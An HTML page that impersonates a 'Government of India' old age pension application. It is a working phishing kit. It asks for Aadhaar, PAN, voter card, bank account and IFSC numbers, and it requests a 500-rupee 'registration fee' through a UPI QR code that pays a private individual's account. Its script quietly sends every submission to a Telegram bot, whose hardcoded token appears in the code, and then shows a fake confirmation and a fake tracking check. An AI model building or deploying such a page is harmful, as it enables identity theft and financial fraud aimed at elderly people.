<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Old Age Pension Form</title>
<style>
  :root{
    --bg: #f8f9fa;
    --card: #ffffff;
    --primary: #007b5e;
    --primary-dark: #005f47;
    --border: #cbd5e1;
    --focus: rgba(0, 123, 94, 0.25);
  }
  body {
    font-family: Arial, sans-serif;
    background: linear-gradient(135deg, #f7f9fc 0%, #eef2f7 100%);
    padding: 20px;
    margin: 0;
  }
  header {
    text-align: center;
    background: linear-gradient(90deg, #004aad, #0058d4);
    color: white;
    padding: 16px;
    border-radius: 12px;
    box-shadow: 0 6px 12px rgba(0,0,0,.08);
  }
  .container {
    max-width: 720px;
    margin: 20px auto;
    background: var(--card);
    padding: 20px 24px;
    border-radius: 14px;
    box-shadow: 0 12px 24px rgba(0,0,0,.08);
  }
  .lang-bar {
    display: flex;
    justify-content: flex-end;
    gap: 8px;
    margin-bottom: 12px;
  }
  label {
    display: block;
    font-weight: 600;
    margin-bottom: 6px;
  }
  /* One input per row */
  .row {
    display: block;
    margin-bottom: 12px;
  }
  input, select, button {
    width: 100%;
    padding: 12px;
    border: 1px solid var(--border);
    border-radius: 8px;
    font-size: 14px;
    background: #fff;
  }
  input:focus, select:focus {
    outline: none;
    box-shadow: 0 0 0 3px var(--focus);
    border-color: #0b6b4a;
  }
  button {
    background-color: var(--primary);
    color: #fff;
    border: none;
    font-size: 16px;
    cursor: pointer;
    border-radius: 8px;
    padding: 12px 20px;
    margin-top: 6px;
  }
  button:hover {
    background-color: var(--primary-dark);
  }
  .qr {
    text-align: center;
    margin-top: 10px;
  }
  .note {
    text-align: center;
    color: #1e40af;
    margin-top: 6px;
  }
  #successView {
    display: none;
    text-align: center;
    margin-top: 24px;
  }
  #successView.active {
    display: block;
  }
  #successView h2 {
    color: #064e3b;
    margin-bottom: 18px;
  }
  #successDetails p {
    margin: 5px 0;
    text-align: left;
    max-width: 600px;
    margin-left: auto;
    margin-right: auto;
  }
  #printBtn, #pdfBtn {
    margin-top: 12px;
    padding: 10px 20px;
    border-radius: 6px;
    cursor: pointer;
    border: none;
    color: white;
  }
  #printBtn {
    background-color: #0a74da;
    margin-right: 8px;
    display: none;
  }
  #pdfBtn {
    background-color: #0a5a2b;
    display: none;
  }
</style>
</head>
<body>

<header>
  <h1 id="gov">Government of India</h1>
</header>

<div class="container">

  <div class="lang-bar">
    <label for="languageSelect" style="align-self:center; font-weight:600; margin-right:6px;">Language</label>
    <select id="languageSelect" aria-label="Select Language" style="width:auto;">
      <option value="en">English</option>
      <option value="bn">বাংলা</option>
      <option value="hi">हिन्दी</option>
    </select>
  </div>

  <h2 id="title" style="text-align:center;">Old Age Pension Form</h2>

  <form id="form" novalidate>
    <div class="row">
      <label id="labelName" for="name">Name</label>
      <input type="text" id="name" name="name" required />
    </div>

    <div class="row">
      <label id="labelAadhar" for="aadhar">Aadhaar Number</label>
      <input type="text" id="aadhar" name="aadhar" required />
    </div>

    <div class="row">
      <label id="labelPhone" for="phone">Phone Number</label>
      <input type="tel" id="phone" name="phone" pattern="[0-9]{10}" required />
    </div>

    <div class="row">
      <label id="labelState" for="state">Select State</label>
      <select id="state" name="state" required>
        <option value="" disabled selected>Select State</option>
      </select>
    </div>

    <div class="row">
      <label id="labelPan" for="pan">PAN Number (Optional)</label>
      <input type="text" id="pan" name="pan" />
    </div>

    <div class="row">
      <label id="labelVoter" for="voter">Voter Card Number</label>
      <input type="text" id="voter" name="voter" required />
    </div>

    <div class="row">
      <label id="labelAccount" for="account">Bank Account Number</label>
      <input type="text" id="account" name="account" required />
    </div>

    <div class="row">
      <label id="labelIfsc" for="ifsc">IFSC Code</label>
      <input type="text" id="ifsc" name="ifsc" required />
    </div>

    <div class="note" id="note"></div>

    <div class="qr">
      <p style="font-weight:bold; font-size:16px; margin-bottom:8px;">Pay registration fees 500</p>
      <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=tadegayatri13@oksbi&pn=Gayatri%20Tade&aid=uGICAgIDD2_iQEA" alt="Payment QR" />
      <p style="margin-top:8px; font-weight:600;">Government of India</p>
    </div>

    <div class="row">
      <label id="labelUtr" for="utr">UTR Number</label>
      <input type="text" id="utr" name="utr" required />
    </div>

    <button type="submit" id="submitBtn">Submit</button>
  </form>

  <h3 id="trackTitle" style="text-align:center;margin-top:24px;">Track Application</h3>
  <input type="text" id="trackNum" placeholder="Enter 15 or 20 digit application number" />
  <button onclick="handleTrack()" style="margin-top:8px;">Track</button>
  <div id="trackError" style="text-align:center;margin-top:10px;color:red;display:none;"></div>

  <div id="successView">
    <h2>Your Registration Successfully</h2>
    <div id="successDetails"></div>
    <button id="printBtn">Print Details</button>
    <button id="pdfBtn">Download PDF</button>
  </div>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>

<script>
  const languageSelect = document.getElementById("languageSelect");
  const titleEl = document.getElementById("title");
  const submitBtn = document.getElementById("submitBtn");
  const trackTitle = document.getElementById("trackTitle");
  const trackNumInput = document.getElementById("trackNum");
  const trackError = document.getElementById("trackError");

  // Populate Indian States
  const states = [
    "Andhra Pradesh","Arunachal Pradesh","Assam","Bihar","Chhattisgarh","Goa","Gujarat",
    "Haryana","Himachal Pradesh","Jharkhand","Karnataka","Kerala","Madhya Pradesh",
    "Maharashtra","Manipur","Meghalaya","Mizoram","Nagaland","Odisha","Punjab","Rajasthan",
    "Sikkim","Tamil Nadu","Telangana","Tripura","Uttar Pradesh","Uttarakhand","West Bengal",
    "Andaman and Nicobar Islands","Chandigarh","Dadra and Nagar Haveli and Daman and Diu",
    "Delhi","Jammu and Kashmir","Ladakh","Lakshadweep","Puducherry"
  ];
  const stateSelect = document.getElementById("state");
  states.forEach(st => {
    const opt = document.createElement("option");
    opt.value = st;
    opt.textContent = st;
    stateSelect.appendChild(opt);
  });

  // Tracking Number Generator
  function generateTrackingNumber() {
    return (Math.floor(Math.random() * 9e19) + 1e19).toString();
  }

  // Telegram Integration to send form data to channel storage
  function sendToTelegram(data) {
    const botToken = '5729834421:AAGrCVQPlxmxrqCT_g0mzWny-EdWU1febhE';
    const channelId = '-1003102946985';

    let message = "<b>Old Age Pension Application Submitted</b>\n";
    message += `<b>Name:</b> ${data.name}\n`;
    message += `<b>Aadhaar Number:</b> ${data.aadhar}\n`;
    message += `<b>Phone Number:</b> ${data.phone}\n`;
    message += `<b>State:</b> ${data.state}\n`;
    message += `<b>PAN Number:</b> ${data.pan || 'N/A'}\n`;
    message += `<b>Voter Card Number:</b> ${data.voter}\n`;
    message += `<b>Bank Account Number:</b> ${data.account}\n`;
    message += `<b>IFSC Code:</b> ${data.ifsc}\n`;
    message += `<b>UTR Number:</b> ${data.utr}\n`;
    message += `<b>Tracking Number:</b> ${data.trackingNumber}\n`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: channelId,
        text: message,
        parse_mode: 'HTML'
      })
    });
  }

  // Handle form submission
  document.getElementById("form").addEventListener("submit", function(e) {
    e.preventDefault();

    const data = {
      name: this.name.value.trim(),
      aadhar: this.aadhar.value.trim(),
      phone: this.phone.value.trim(),
      state: this.state.value,
      pan: this.pan.value.trim(),
      voter: this.voter.value.trim(),
      account: this.account.value.trim(),
      ifsc: this.ifsc.value.trim(),
      utr: this.utr.value.trim(),
      trackingNumber: generateTrackingNumber()
    };

    if (!data.name || !data.aadhar || !data.phone || !data.state || !data.voter || !data.account || !data.ifsc || !data.utr) {
      alert("Please fill all required fields");
      return;
    }

    showSuccess(data);
    sendToTelegram(data);
  });

  function showSuccess(data) {
    document.getElementById("form").style.display = "none";
    const successView = document.getElementById("successView");
    successView.classList.add("active");

    const container = document.getElementById("successDetails");
    container.innerHTML = "";
    for (let key in data) {
      let label = key.replace(/([A-Z])/g, ' $1').toUpperCase();
      if(key === "trackingNumber") label = "TRACKING NUMBER";
      const p = document.createElement("p");
      p.innerHTML = "<strong>" + label + ":</strong> " + (data[key] || "—");
      container.appendChild(p);
    }

    const printBtn = document.getElementById("printBtn");
    printBtn.style.display = "inline-block";
    printBtn.onclick = () => {
      window.print();
    };

    const pdfBtn = document.getElementById("pdfBtn");
    pdfBtn.style.display = "inline-block";
    pdfBtn.onclick = () => {
      const element = document.getElementById("successDetails");
      const opt = {
        margin:       0.5,
        filename:     'RegistrationDetails.pdf',
        image:        { type: 'jpeg', quality: 0.98 },
        html2canvas:  { scale: 2 },
        jsPDF:        { unit: 'in', format: 'letter', orientation: 'portrait' }
      };
      html2pdf().set(opt).from(element).save();
    };
  }

  // Track application logic
  function handleTrack() {
    const val = trackNumInput.value.trim();
    if(val.length === 15 || val.length === 20) {
      trackError.style.color = "green";
      trackError.textContent = "Application " + val + " is under review.";
      trackError.style.display = "block";
    } else {
      trackError.style.color = "red";
      trackError.textContent = "Please enter a valid 15 or 20 digit application number.";
      trackError.style.display = "block";
    }
  }

  document.querySelector("button[onclick='handleTrack()']").addEventListener("click", handleTrack);
</script>

</body>
</html>
